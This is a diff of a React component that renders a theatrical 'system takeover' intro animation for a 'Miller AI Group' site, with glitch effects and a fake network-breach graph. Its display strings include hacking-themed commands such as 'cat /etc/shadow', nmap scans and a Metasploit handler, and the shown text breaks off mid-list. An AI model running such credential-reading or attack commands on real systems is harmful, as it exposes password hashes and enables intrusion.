@@ -1,381 +1,119 @@
 'use client'
 
-import { useState, useEffect, useCallback, useRef } from 'react'
+import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
 import { motion, AnimatePresence } from 'framer-motion'
 import Image from 'next/image'
 
 // ============================================
 // TYPES
 // ============================================
+type SceneType =
+  | 'boot'
+  | 'interference'
+  | 'network-breach'
+  | 'terminal-takeover'
+  | 'file-intrusion'
+  | 'character-briefing'
+  | 'system-owned'
+  | 'complete'
+
 interface CinematicTakeoverProps {
   onComplete: () => void
   userName?: string
 }
 
-interface TerminalLine {
-  text: string
-  type: 'command' | 'output' | 'error' | 'success' | 'warning'
-  delay?: number
-}
-
-interface SystemAlert {
-  id: string
-  type: 'warning' | 'error' | 'success' | 'breach'
-  title: string
-  message: string
-  x: number
-  y: number
-}
-
 // ============================================
-// CHARACTER DATA WITH REAL IMAGES
+// CHARACTER DATA - Iconic, Recognizable
 // ============================================
-const CHARACTERS = [
+export const CHARACTERS = [
   {
     id: 'wick',
     name: 'JOHN WICK',
-    subtitle: 'THE BOOGEYMAN',
-    quote: 'People keep asking if I\'m back...',
+    codename: 'BABA YAGA',
+    quote: "People keep asking if I'm back. Yeah, I'm thinking I'm back.",
+    specialty: 'TACTICAL ELIMINATION',
+    threat: 'EXTREME',
     color: '#ff0040',
-    image: '/characters/wick.png', // We'll use a placeholder approach
-    role: 'SECURITY ELIMINATION'
+    accentColor: '#8b0000',
+    // Visual identifiers for canvas drawing
+    features: {
+      hair: 'long-dark',
+      beard: 'stubble',
+      suit: 'black-tactical',
+      icon: 'crosshair'
+    }
   },
   {
     id: 'bart',
     name: 'BART SIMPSON',
-    subtitle: 'CHAOS AGENT',
-    quote: 'Eat my shorts, firewall.',
+    codename: 'EL BARTO',
+    quote: "Eat my shorts, firewall.",
+    specialty: 'CHAOS ENGINEERING',
+    threat: 'UNPREDICTABLE',
     color: '#ffd700',
-    image: '/characters/bart.png',
-    role: 'SYSTEM DISRUPTION'
+    accentColor: '#ff8c00',
+    features: {
+      hair: 'spiky-yellow',
+      shirt: 'red',
+      expression: 'mischievous',
+      icon: 'spray-can'
+    }
   },
   {
     id: 'joker',
     name: 'THE JOKER',
-    subtitle: 'AGENT OF CHAOS',
-    quote: 'Why so serious about security?',
+    codename: 'AGENT OF CHAOS',
+    quote: "Why so serious about your security?",
+    specialty: 'PSYCHOLOGICAL WARFARE',
+    threat: 'MAXIMUM',
     color: '#9d00ff',
-    image: '/characters/joker.png',
-    role: 'PSYCHOLOGICAL WARFARE'
+    accentColor: '#4a0080',
+    features: {
+      hair: 'green-slicked',
+      face: 'white-paint',
+      smile: 'red-scars',
+      suit: 'purple',
+      icon: 'playing-card'
+    }
   },
   {
     id: 'wolf',
     name: 'JORDAN BELFORT',
-    subtitle: 'THE WOLF',
-    quote: 'I\'m not leaving. I\'m not f***ing leaving!',
+    codename: 'THE WOLF',
+    quote: "I'm not f***ing leaving!",
+    specialty: 'FINANCIAL EXTRACTION',
+    threat: 'SEVERE',
     color: '#00ff41',
-    image: '/characters/wolf.png',
-    role: 'FINANCIAL EXTRACTION'
+    accentColor: '#006400',
+    features: {
+      hair: 'slicked-back',
+      suit: 'expensive',
+      expression: 'confident',
+      icon: 'dollar'
+    }
   },
   {
-    id: 'margot',
+    id: 'duchess',
     name: 'NAOMI LAPAGLIA',
-    subtitle: 'THE DUCHESS',
-    quote: 'Let me explain this simply...',
+    codename: 'THE DUCHESS',
+    quote: "Let me put this in terms you'll understand.",
+    specialty: 'SOCIAL ENGINEERING',
+    threat: 'HIGH',
     color: '#ff1493',
-    image: '/characters/margot.png',
-    role: 'SOCIAL ENGINEERING'
+    accentColor: '#c71585',
+    features: {
+      hair: 'blonde-long',
+      dress: 'elegant',
+      expression: 'commanding',
+      icon: 'crown'
+    }
   },
 ]
 
 // ============================================
-// TERMINAL SEQUENCES
+// DEDSEC-STYLE DITHER EFFECT CANVAS
 // ============================================
-const TERMINAL_SEQUENCES: Record<string, TerminalLine[]> = {
-  init: [
-    { text: '$ initiating_breach_protocol --force', type: 'command' },
-    { text: 'Connecting to target: 192.168.1.1...', type: 'output' },
-    { text: 'Connection established.', type: 'success' },
-    { text: '$ nmap -sV -sC target_system', type: 'command' },
-    { text: 'Scanning ports... 22/tcp open ssh', type: 'output' },
-    { text: '443/tcp open https', type: 'output' },
-    { text: '3306/tcp open mysql', type: 'output' },
-    { text: '$ exploit --payload=miller_rootkit', type: 'command' },
-    { text: '[!] Firewall detected...', type: 'warning' },
-    { text: '[+] Bypassing firewall...', type: 'output' },
-    { text: '[+] FIREWALL BYPASSED', type: 'success' },
-  ],
-  breach: [
-    { text: '$ sudo access_mainframe --elevated', type: 'command' },
-    { text: 'Requesting elevated privileges...', type: 'output' },
-    { text: '[!] ACCESS DENIED', type: 'error' },
-    { text: '$ inject_payload --stealth', type: 'command' },
-    { text: 'Injecting Miller AI rootkit...', type: 'output' },
-    { text: '████████████████████ 100%', type: 'output' },
-    { text: '[+] Rootkit deployed successfully', type: 'success' },
-    { text: '$ escalate_privileges --root', type: 'command' },
-    { text: '[+] ROOT ACCESS GRANTED', type: 'success' },
-  ],
-  extraction: [
-    { text: '$ dump_credentials --all', type: 'command' },
-    { text: 'Extracting user credentials...', type: 'output' },
-    { text: 'Found: 847 credential pairs', type: 'success' },
-    { text: '$ exfiltrate_data --encrypt', type: 'command' },
-    { text: 'Encrypting extracted data...', type: 'output' },
-    { text: 'Uploading to Miller AI servers...', type: 'output' },
-    { text: '[+] DATA EXFILTRATION COMPLETE', type: 'success' },
-    { text: '$ install_backdoor --persistent', type: 'command' },
-    { text: '[+] BACKDOOR INSTALLED', type: 'success' },
-    { text: '[+] SYSTEM COMPROMISED', type: 'success' },
-  ],
-  final: [
-    { text: '$ miller_ai --takeover --complete', type: 'command' },
-    { text: '', type: 'output' },
-    { text: '███╗   ███╗██╗██╗     ██╗     ███████╗██████╗ ', type: 'success' },
-    { text: '████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗', type: 'success' },
-    { text: '██╔████╔██║██║██║     ██║     █████╗  ██████╔╝', type: 'success' },
-    { text: '██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗', type: 'success' },
-    { text: '██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║', type: 'success' },
-    { text: '╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝', type: 'success' },
-    { text: '', type: 'output' },
-    { text: '[+] WELCOME TO MILLER AI GROUP OS', type: 'success' },
-    { text: '[+] You are now part of the system.', type: 'success' },
-  ]
-}
-
-// ============================================
-// GLITCH TEXT COMPONENT
-// ============================================
-function GlitchText({
-  children,
-  className = '',
-  intensity = 1
-}: {
-  children: string
-  className?: string
-  intensity?: number
-}) {
-  const [glitchActive, setGlitchActive] = useState(false)
-
-  useEffect(() => {
-    const interval = setInterval(() => {
-      setGlitchActive(true)
-      setTimeout(() => setGlitchActive(false), 100 * intensity)
-    }, 2000 / intensity)
-    return () => clearInterval(interval)
-  }, [intensity])
-
-  return (
-    <span className={`relative inline-block ${className}`}>
-      <span className="relative z-10">{children}</span>
-      {glitchActive && (
-        <>
-          <span
-            className="absolute top-0 left-0 z-20 opacity-80"
-            style={{
-              color: '#ff0000',
-              transform: `translate(${Math.random() * 4 - 2}px, ${Math.random() * 2 - 1}px)`,
-              clipPath: 'inset(0 0 50% 0)'
-            }}
-          >
-            {children}
-          </span>
-          <span
-            className="absolute top-0 left-0 z-20 opacity-80"
-            style={{
-              color: '#00ffff',
-              transform: `translate(${Math.random() * -4 + 2}px, ${Math.random() * 2 - 1}px)`,
-              clipPath: 'inset(50% 0 0 0)'
-            }}
-          >
-            {children}
-          </span>
-        </>
-      )}
-    </span>
-  )
-}
-
-// ============================================
-// TERMINAL WINDOW COMPONENT
-// ============================================
-function TerminalWindow({
-  title = 'root@miller-ai:~#',
-  lines,
-  x = 0,
-  y = 0,
-  width = 500,
-  onComplete,
-  speed = 50,
-  minimized = false
-}: {
-  title?: string
-  lines: TerminalLine[]
-  x?: number
-  y?: number
-  width?: number
-  onComplete?: () => void
-  speed?: number
-  minimized?: boolean
-}) {
-  const [visibleLines, setVisibleLines] = useState<TerminalLine[]>([])
-  const [currentLine, setCurrentLine] = useState(0)
-  const [currentChar, setCurrentChar] = useState(0)
-  const containerRef = useRef<HTMLDivElement>(null)
-
-  useEffect(() => {
-    if (currentLine >= lines.length) {
-      onComplete?.()
-      return
-    }
-
-    const line = lines[currentLine]
-
-    if (currentChar < line.text.length) {
-      const timer = setTimeout(() => {
-        setCurrentChar(c => c + 1)
-      }, line.type === 'command' ? speed : speed / 3)
-      return () => clearTimeout(timer)
-    } else {
-      const timer = setTimeout(() => {
-        setVisibleLines(prev => [...prev, { ...line, text: line.text }])
-        setCurrentLine(l => l + 1)
-        setCurrentChar(0)
-      }, 100)
-      return () => clearTimeout(timer)
-    }
-  }, [currentLine, currentChar, lines, onComplete, speed])
-
-  useEffect(() => {
-    if (containerRef.current) {
-      containerRef.current.scrollTop = containerRef.current.scrollHeight
-    }
-  }, [visibleLines, currentChar])
-
-  const getLineColor = (type: TerminalLine['type']) => {
-    switch (type) {
-      case 'command': return '#00ff41'
-      case 'success': return '#00ff41'
-      case 'error': return '#ff0040'
-      case 'warning': return '#ffd700'
-      default: return '#ffffff'
-    }
-  }
-
-  if (minimized) return null
-
-  return (
-    <motion.div
-      className="absolute rounded-lg overflow-hidden shadow-2xl"
-      style={{
-        left: x,
-        top: y,
-        width,
-        background: 'rgba(0,0,0,0.95)',
-        border: '1px solid rgba(0,255,65,0.3)',
-        boxShadow: '0 0 30px rgba(0,255,65,0.2), inset 0 0 60px rgba(0,0,0,0.5)'
-      }}
-      initial={{ opacity: 0, scale: 0.8, y: 20 }}
-      animate={{ opacity: 1, scale: 1, y: 0 }}
-      exit={{ opacity: 0, scale: 0.8 }}
-    >
-      {/* Title bar */}
-      <div
-        className="px-3 py-2 flex items-center gap-2"
-        style={{ background: 'rgba(0,255,65,0.1)', borderBottom: '1px solid rgba(0,255,65,0.2)' }}
-      >
-        <div className="flex gap-1.5">
-          <div className="w-3 h-3 rounded-full bg-red-500" />
-          <div className="w-3 h-3 rounded-full bg-yellow-500" />
-          <div className="w-3 h-3 rounded-full bg-green-500" />
-        </div>
-        <span className="text-xs font-mono text-green-400 ml-2">{title}</span>
-      </div>
-
-      {/* Terminal content */}
-      <div
-        ref={containerRef}
-        className="p-3 font-mono text-xs overflow-y-auto"
-        style={{ height: 200, background: 'rgba(0,10,0,0.8)' }}
-      >
-        {visibleLines.map((line, i) => (
-          <div key={i} style={{ color: getLineColor(line.type) }} className="leading-relaxed">
-            {line.text}
-          </div>
-        ))}
-        {currentLine < lines.length && (
-          <div style={{ color: getLineColor(lines[currentLine].type) }}>
-            {lines[currentLine].text.substring(0, currentChar)}
-            <motion.span
-              animate={{ opacity: [1, 0] }}
-              transition={{ duration: 0.5, repeat: Infinity }}
-            >
-              █
-            </motion.span>
-          </div>
-        )}
-      </div>
-    </motion.div>
-  )
-}
-
-// ============================================
-// SYSTEM ALERT COMPONENT
-// ============================================
-function SystemAlertPopup({ alert, onDismiss }: { alert: SystemAlert; onDismiss: () => void }) {
-  useEffect(() => {
-    const timer = setTimeout(onDismiss, 3000)
-    return () => clearTimeout(timer)
-  }, [onDismiss])
-
-  const colors = {
-    warning: { bg: 'rgba(255,215,0,0.1)', border: '#ffd700', text: '#ffd700' },
-    error: { bg: 'rgba(255,0,64,0.1)', border: '#ff0040', text: '#ff0040' },
-    success: { bg: 'rgba(0,255,65,0.1)', border: '#00ff41', text: '#00ff41' },
-    breach: { bg: 'rgba(255,0,255,0.1)', border: '#ff00ff', text: '#ff00ff' },
-  }
-
-  const c = colors[alert.type]
-
-  return (
-    <motion.div
-      className="absolute z-50 rounded-lg p-4 backdrop-blur-sm"
-      style={{
-        left: alert.x,
-        top: alert.y,
-        background: c.bg,
-        border: `2px solid ${c.border}`,
-        boxShadow: `0 0 30px ${c.border}50`,
-        minWidth: 300,
-      }}
-      initial={{ opacity: 0, scale: 0.5, y: -20 }}
-      animate={{ opacity: 1, scale: 1, y: 0 }}
-      exit={{ opacity: 0, scale: 0.5, y: -20 }}
-    >
-      <div className="flex items-start gap-3">
-        <motion.div
-          className="text-2xl"
-          animate={{ scale: [1, 1.2, 1] }}
-          transition={{ duration: 0.5, repeat: Infinity }}
-        >
-          {alert.type === 'warning' && '⚠️'}
-          {alert.type === 'error' && '🚫'}
-          {alert.type === 'success' && '✅'}
-          {alert.type === 'breach' && '💀'}
-        </motion.div>
-        <div>
-          <h4 className="font-mono font-bold text-sm" style={{ color: c.text }}>
-            {alert.title}
-          </h4>
-          <p className="font-mono text-xs text-neutral-400 mt-1">
-            {alert.message}
-          </p>
-        </div>
-      </div>
-    </motion.div>
-  )
-}
-
-// ============================================
-// ANIMATED CHARACTER SILHOUETTE - Watch Dogs Style
-// ============================================
-function AnimatedCharacterSilhouette({
-  character,
-  size = 280
-}: {
-  character: typeof CHARACTERS[0]
-  size?: number
-}) {
+function DedSecBackground({ intensity = 1 }: { intensity?: number }) {
   const canvasRef = useRef<HTMLCanvasElement>(null)
   const frameRef = useRef(0)
   const animationRef = useRef<number | undefined>(undefined)
@@ -383,14 +121,1024 @@ function AnimatedCharacterSilhouette({
   useEffect(() => {
     const canvas = canvasRef.current
     if (!canvas) return
-
     const ctx = canvas.getContext('2d')
     if (!ctx) return
 
+    const resize = () => {
+      canvas.width = window.innerWidth
+      canvas.height = window.innerHeight
+    }
+    resize()
+    window.addEventListener('resize', resize)
+
+    // DedSec style patterns
+    const patterns = ['█', '▓', '▒', '░', '▄', '▀', '■', '□', '●', '○']
+
+    const animate = () => {
+      frameRef.current++
+
+      // Dark base with slight noise
+      ctx.fillStyle = '#000000'
+      ctx.fillRect(0, 0, canvas.width, canvas.height)
+
+      // Scanline effect
+      for (let y = 0; y < canvas.height; y += 3) {
+        ctx.fillStyle = `rgba(255,255,255,${0.02 * intensity})`
+        ctx.fillRect(0, y, canvas.width, 1)
+      }
+
+      // Random glitch blocks
+      if (Math.random() > 0.95) {
+        const blockCount = Math.floor(Math.random() * 5 * intensity)
+        for (let i = 0; i < blockCount; i++) {
+          const x = Math.random() * canvas.width
+          const y = Math.random() * canvas.height
+          const w = Math.random() * 200 + 50
+          const h = Math.random() * 20 + 5
+          ctx.fillStyle = `rgba(${Math.random() > 0.5 ? '255,0,255' : '0,255,255'},${Math.random() * 0.3})`
+          ctx.fillRect(x, y, w, h)
+        }
+      }
+
+      // Floating data characters (DedSec style)
+      ctx.font = '12px monospace'
+      for (let i = 0; i < 30 * intensity; i++) {
+        const x = (frameRef.current * (i % 5 + 1) + i * 50) % canvas.width
+        const y = (frameRef.current * 0.5 + i * 30) % canvas.height
+        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.3})`
+        ctx.fillText(patterns[Math.floor(Math.random() * patterns.length)], x, y)
+      }
+
+      // Horizontal interference lines
+      if (Math.random() > 0.9) {
+        const y = Math.random() * canvas.height
+        ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.5})`
+        ctx.fillRect(0, y, canvas.width, Math.random() * 3 + 1)
+      }
+
+      animationRef.current = requestAnimationFrame(animate)
+    }
+
+    animate()
+
+    return () => {
+      window.removeEventListener('resize', resize)
+      if (animationRef.current) cancelAnimationFrame(animationRef.current)
+    }
+  }, [intensity])
+
+  return <canvas ref={canvasRef} className="fixed inset-0 z-0" />
+}
+
+// ============================================
+// SCENE 1: BOOT SEQUENCE
+// ============================================
+function BootSequence({ onComplete }: { onComplete: () => void }) {
+  const [lines, setLines] = useState<string[]>([])
+  const bootLines = useMemo(() => [
+    'BIOS Version 4.2.1 - Miller AI Systems',
+    'Detecting hardware...',
+    'CPU: Intel Core i9-13900K @ 5.8GHz',
+    'RAM: 64GB DDR5-6400',
+    'GPU: NVIDIA RTX 4090',
+    'Storage: 4TB NVMe SSD',
+    '',
+    'POST complete.',
+    'Loading kernel...',
+    '',
+    '██████████████████████████████ 100%',
+    '',
+    'KERNEL PANIC - NOT SYNCING',
+    '[ERROR] Unauthorized access detected',
+    '[ERROR] Unknown entity in kernel space',
+    '[CRITICAL] System integrity compromised',
+    '',
+    '> EXTERNAL BREACH DETECTED',
+    '> INITIATING LOCKDOWN...',
+    '> LOCKDOWN FAILED',
+    '',
+    '>>> MILLER AI GROUP HAS ENTERED THE SYSTEM <<<',
+  ], [])
+
+  useEffect(() => {
+    let i = 0
+    const interval = setInterval(() => {
+      if (i < bootLines.length) {
+        setLines(prev => [...prev, bootLines[i]])
+        i++
+      } else {
+        clearInterval(interval)
+        setTimeout(onComplete, 1500)
+      }
+    }, 120)
+    return () => clearInterval(interval)
+  }, [bootLines, onComplete])
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-10 bg-black p-8 font-mono text-sm overflow-hidden"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      {/* CRT effect overlay */}
+      <div className="absolute inset-0 pointer-events-none" style={{
+        background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
+      }} />
+
+      {/* Curved screen effect */}
+      <div className="absolute inset-0 pointer-events-none" style={{
+        boxShadow: 'inset 0 0 150px rgba(0,0,0,0.9)',
+        borderRadius: '20px',
+      }} />
+
+      <div className="relative z-10">
+        {lines.map((line, i) => (
+          <motion.div
+            key={i}
+            initial={{ opacity: 0, x: -20 }}
+            animate={{ opacity: 1, x: 0 }}
+            className={`
+              ${line.includes('ERROR') || line.includes('CRITICAL') ? 'text-red-500' : ''}
+              ${line.includes('MILLER') ? 'text-fuchsia-500 font-bold text-lg' : ''}
+              ${line.includes('███') ? 'text-green-500' : ''}
+              ${!line.includes('ERROR') && !line.includes('CRITICAL') && !line.includes('MILLER') && !line.includes('███') ? 'text-green-400' : ''}
+            `}
+          >
+            {line}
+          </motion.div>
+        ))}
+        <motion.span
+          className="text-green-400"
+          animate={{ opacity: [1, 0] }}
+          transition={{ duration: 0.5, repeat: Infinity }}
+        >
+          █
+        </motion.span>
+      </div>
+    </motion.div>
+  )
+}
+
+// ============================================
+// SCENE 2: INTERFERENCE / STATIC TAKEOVER
+// ============================================
+function InterferenceScene({ onComplete }: { onComplete: () => void }) {
+  const canvasRef = useRef<HTMLCanvasElement>(null)
+  const [showMessage, setShowMessage] = useState(false)
+  const [messageIndex, setMessageIndex] = useState(0)
+
+  const messages = useMemo(() => [
+    'W̷̢̛E̵͎͝ ̴̱̈́A̸̰͝R̵͓̈E̷̲͑ ̶̣̌Ẅ̵̰́A̴̝͘T̵̰̕C̵̣͌H̵͇̊Ḯ̴͜N̸̰͒G̷̱̈',
+    'Y̷̨͠O̵͔̓U̵̗͛R̶̨̈ ̷̮͝S̵̱̈́Y̶̧̛S̴̱͑T̵̰͘E̵͇̕M̴̝̊ ̷̱̈I̶̧̛S̵̱̊ ̷̮̈́Ö̷̧́Ụ̶̈R̷̨͝S̴̱̕',
+    'R̷̨͝E̵͔͝S̴̱͑I̵̗̊S̴̱̕T̵̰͑Å̵̝Ṉ̷̈Ç̶̛E̵͔͝ ̷̮̈́I̵̗̊S̴̱̕ ̷̮͝F̵̗̊U̵̗͛T̵̰̕I̵̗̊L̵͔͝E̵͔͝',
+  ], [])
+
+  useEffect(() => {
+    const canvas = canvasRef.current
+    if (!canvas) return
+    const ctx = canvas.getContext('2d')
+    if (!ctx) return
+
+    canvas.width = window.innerWidth
+    canvas.height = window.innerHeight
+
+    let frame = 0
+    let animationId: number
+
+    const animate = () => {
+      frame++
+
+      // Heavy static noise
+      const imageData = ctx.createImageData(canvas.width, canvas.height)
+      for (let i = 0; i < imageData.data.length; i += 4) {
+        const noise = Math.random() * 255
+        const glitch = Math.random() > 0.99
+        imageData.data[i] = glitch ? 255 : noise * 0.3     // R
+        imageData.data[i + 1] = glitch ? 0 : noise * 0.3   // G
+        imageData.data[i + 2] = glitch ? 255 : noise * 0.3 // B
+        imageData.data[i + 3] = 255                         // A
+      }
+      ctx.putImageData(imageData, 0, 0)
+
+      // Horizontal tear lines
+      for (let i = 0; i < 10; i++) {
+        const y = (frame * 3 + i * 100) % canvas.height
+        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.8})`
+        ctx.fillRect(0, y, canvas.width, Math.random() * 10 + 2)
+      }
+
+      // RGB shift blocks
+      if (Math.random() > 0.8) {
+        const y = Math.random() * canvas.height
+        const h = Math.random() * 50 + 20
+        ctx.fillStyle = 'rgba(255,0,0,0.5)'
+        ctx.fillRect(Math.random() * 20 - 10, y, canvas.width, h)
+        ctx.fillStyle = 'rgba(0,255,255,0.5)'
+        ctx.fillRect(Math.random() * 20 - 10 + 5, y, canvas.width, h)
+      }
+
+      animationId = requestAnimationFrame(animate)
+    }
+
+    animate()
+
+    // Show glitched messages
+    setTimeout(() => setShowMessage(true), 500)
+    const msgInterval = setInterval(() => {
+      setMessageIndex(prev => (prev + 1) % messages.length)
+    }, 800)
+
+    // Complete after dramatic pause
+    const timer = setTimeout(onComplete, 4000)
+
+    return () => {
+      cancelAnimationFrame(animationId)
+      clearInterval(msgInterval)
+      clearTimeout(timer)
+    }
+  }, [messages, onComplete])
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-20"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      <canvas ref={canvasRef} className="absolute inset-0" />
+
+      <AnimatePresence>
+        {showMessage && (
+          <motion.div
+            className="absolute inset-0 flex items-center justify-center"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+          >
+            <motion.h1
+              key={messageIndex}
+              className="text-6xl md:text-8xl font-bold font-mono text-center px-4"
+              style={{
+                color: '#ff00ff',
+                textShadow: '0 0 50px #ff00ff, 4px 0 0 #00ffff, -4px 0 0 #ff0000',
+                filter: 'blur(0.5px)',
+              }}
+              initial={{ scale: 0.5, opacity: 0 }}
+              animate={{
+                scale: [1, 1.05, 1],
+                opacity: 1,
+                x: [0, -5, 5, -3, 0],
+              }}
+              transition={{ duration: 0.3 }}
+            >
+              {messages[messageIndex]}
+            </motion.h1>
+          </motion.div>
+        )}
+      </AnimatePresence>
+    </motion.div>
+  )
+}
+
+// ============================================
+// SCENE 3: NETWORK BREACH VISUALIZATION
+// ============================================
+function NetworkBreachScene({ onComplete }: { onComplete: () => void }) {
+  const canvasRef = useRef<HTMLCanvasElement>(null)
+  const [breachedNodes, setBreachedNodes] = useState(0)
+  const [status, setStatus] = useState('SCANNING NETWORK...')
+
+  useEffect(() => {
+    const canvas = canvasRef.current
+    if (!canvas) return
+    const ctx = canvas.getContext('2d')
+    if (!ctx) return
+
+    canvas.width = window.innerWidth
+    canvas.height = window.innerHeight
+
+    const centerX = canvas.width / 2
+    const centerY = canvas.height / 2
+
+    // Create network nodes
+    const nodes: Array<{
+      x: number
+      y: number
+      label: string
+      breached: boolean
+      connections: number[]
+    }> = []
+
+    // Central target
+    nodes.push({ x: centerX, y: centerY, label: 'TARGET', breached: false, connections: [] })
+
+    // Surrounding nodes
+    const nodeLabels = [
+      'FIREWALL', 'ROUTER', 'DATABASE', 'AUTH_SRV', 'WEB_SRV',
+      'MAIL_SRV', 'FILE_SRV', 'BACKUP', 'DMZ', 'PROXY',
+      'DNS', 'LDAP', 'API_GW', 'CACHE', 'MONITOR'
+    ]
+
+    for (let i = 0; i < 15; i++) {
+      const angle = (i / 15) * Math.PI * 2
+      const radius = 150 + Math.random() * 100
+      nodes.push({
+        x: centerX + Math.cos(angle) * radius,
+        y: centerY + Math.sin(angle) * radius,
+        label: nodeLabels[i],
+        breached: false,
+        connections: [0, (i + 1) % 15 + 1, (i + 8) % 15 + 1]
+      })
+    }
+
+    let frame = 0
+    let animationId: number
+    let currentBreach = 1
+
+    const animate = () => {
+      frame++
+
+      // Dark background with grid
+      ctx.fillStyle = '#0a0a0a'
+      ctx.fillRect(0, 0, canvas.width, canvas.height)
+
+      // Grid
+      ctx.strokeStyle = 'rgba(255,0,255,0.1)'
+      ctx.lineWidth = 1
+      for (let x = 0; x < canvas.width; x += 40) {
+        ctx.beginPath()
+        ctx.moveTo(x, 0)
+        ctx.lineTo(x, canvas.height)
+        ctx.stroke()
+      }
+      for (let y = 0; y < canvas.height; y += 40) {
+        ctx.beginPath()
+        ctx.moveTo(0, y)
+        ctx.lineTo(canvas.width, y)
+        ctx.stroke()
+      }
+
+      // Draw connections
+      nodes.forEach((node, i) => {
+        node.connections.forEach(targetIdx => {
+          const target = nodes[targetIdx]
+          if (!target) return
+
+          ctx.beginPath()
+          ctx.moveTo(node.x, node.y)
+          ctx.lineTo(target.x, target.y)
+          ctx.strokeStyle = node.breached && target.breached
+            ? 'rgba(255,0,255,0.8)'
+            : 'rgba(0,255,255,0.2)'
+          ctx.lineWidth = node.breached && target.breached ? 3 : 1
+          ctx.stroke()
+
+          // Data packet animation on breached connections
+          if (node.breached && target.breached) {
+            const progress = (frame % 60) / 60
+            const px = node.x + (target.x - node.x) * progress
+            const py = node.y + (target.y - node.y) * progress
+            ctx.fillStyle = '#ff00ff'
+            ctx.beginPath()
+            ctx.arc(px, py, 4, 0, Math.PI * 2)
+            ctx.fill()
+          }
+        })
+      })
+
+      // Draw nodes
+      nodes.forEach((node, i) => {
+        // Node glow
+        if (node.breached) {
+          ctx.beginPath()
+          ctx.arc(node.x, node.y, 35, 0, Math.PI * 2)
+          const gradient = ctx.createRadialGradient(node.x, node.y, 0, node.x, node.y, 35)
+          gradient.addColorStop(0, 'rgba(255,0,255,0.5)')
+          gradient.addColorStop(1, 'transparent')
+          ctx.fillStyle = gradient
+          ctx.fill()
+        }
+
+        // Node circle
+        ctx.beginPath()
+        ctx.arc(node.x, node.y, i === 0 ? 30 : 20, 0, Math.PI * 2)
+        ctx.fillStyle = node.breached ? '#ff00ff' : '#1a1a1a'
+        ctx.strokeStyle = node.breached ? '#ff00ff' : '#00ffff'
+        ctx.lineWidth = 2
+        ctx.fill()
+        ctx.stroke()
+
+        // Node label
+        ctx.font = 'bold 10px monospace'
+        ctx.fillStyle = node.breached ? '#ffffff' : '#00ffff'
+        ctx.textAlign = 'center'
+        ctx.fillText(node.label, node.x, node.y + 35)
+
+        // Breach animation
+        if (node.breached) {
+          ctx.font = 'bold 12px monospace'
+          ctx.fillStyle = '#ff0040'
+          ctx.fillText('PWNED', node.x, node.y + 4)
+        }
+      })
+
+      // Scanning effect
+      const scanY = (frame * 3) % canvas.height
+      ctx.fillStyle = 'rgba(0,255,255,0.1)'
+      ctx.fillRect(0, scanY, canvas.width, 5)
+
+      animationId = requestAnimationFrame(animate)
+    }
+
+    animate()
+
+    // Breach nodes progressively
+    const breachInterval = setInterval(() => {
+      if (currentBreach < nodes.length) {
+        nodes[currentBreach].breached = true
+        setBreachedNodes(currentBreach)
+
+        if (currentBreach === 1) setStatus('BYPASSING FIREWALL...')
+        if (currentBreach === 3) setStatus('ACCESSING DATABASE...')
+        if (currentBreach === 5) setStatus('ESCALATING PRIVILEGES...')
+        if (currentBreach === 10) setStatus('INSTALLING BACKDOORS...')
+        if (currentBreach === 14) {
+          setStatus('NETWORK COMPROMISED')
+          nodes[0].breached = true // Breach central target
+        }
+
+        currentBreach++
+      } else {
+        clearInterval(breachInterval)
+        setTimeout(onComplete, 2000)
+      }
+    }, 300)
+
+    return () => {
+      cancelAnimationFrame(animationId)
+      clearInterval(breachInterval)
+    }
+  }, [onComplete])
+
+  return (
+    <motion.div
+      className="fixed inset-0 z-20"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+    >
+      <canvas ref={canvasRef} className="absolute inset-0" />
+
+      {/* HUD Overlay */}
+      <div className="absolute top-4 left-4 font-mono text-sm">
+        <div className="text-fuchsia-500 mb-2">{'>'} NETWORK INTRUSION ACTIVE</div>
+        <div className="text-cyan-400">NODES COMPROMISED: {breachedNodes}/15</div>
+        <div className="text-yellow-400 mt-2">{status}</div>
+      </div>
+
+      {/* Progress bar */}
+      <div className="absolute bottom-8 left-8 right-8">
+        <div className="h-2 bg-neutral-800 rounded overflow-hidden">
+          <motion.div
+            className="h-full bg-fuchsia-500"
+            initial={{ width: '0%' }}
+            animate={{ width: `${(breachedNodes / 15) * 100}%` }}
+            transition={{ duration: 0.3 }}
+          />
+        </div>
+        <div className="text-center mt-2 font-mono text-xs text-fuchsia-400">
+          BREACH PROGRESS: {Math.round((breachedNodes / 15) * 100)}%
+        </div>
+      </div>
+    </motion.div>
+  )
+}
+
+// ============================================
+// SCENE 4: TERMINAL TAKEOVER
+// ============================================
+function TerminalTakeoverScene({ onComplete }: { onComplete: () => void }) {
+  const [terminals, setTerminals] = useState<Array<{
+    id: number
+    lines: string[]
+    x: number
+    y: number
+    title: string
+  }>>([])
+
+  const terminalCommands = useMemo(() => ({
+    main: [
+      '$ whoami',
+      'root',
+      '$ cat /etc/shadow',
+      'root:$6$xyz....:19000:0:99999:7:::',
+      'admin:$6$abc....:19000:0:99999:7:::',
+      '$ ls -la /home',
+      'drwxr-xr-x  5 root root  4096 Dec 28 04:20 .',
+      'drwxr-xr-x 18 root root  4096 Dec 28 04:20 ..',
+      'drwxr-xr-x  3 admin admin 4096 Dec 28 04:20 admin',
+      '$ ./miller_payload --inject',
+      '[*] Injecting payload into kernel...',
+      '[+] Payload injected successfully',
+      '[+] Establishing persistence...',
+      '[+] C2 callback established',
+    ],
+    exploit: [
+      '$ msfconsole -q',
+      'msf6 > use exploit/multi/handler',
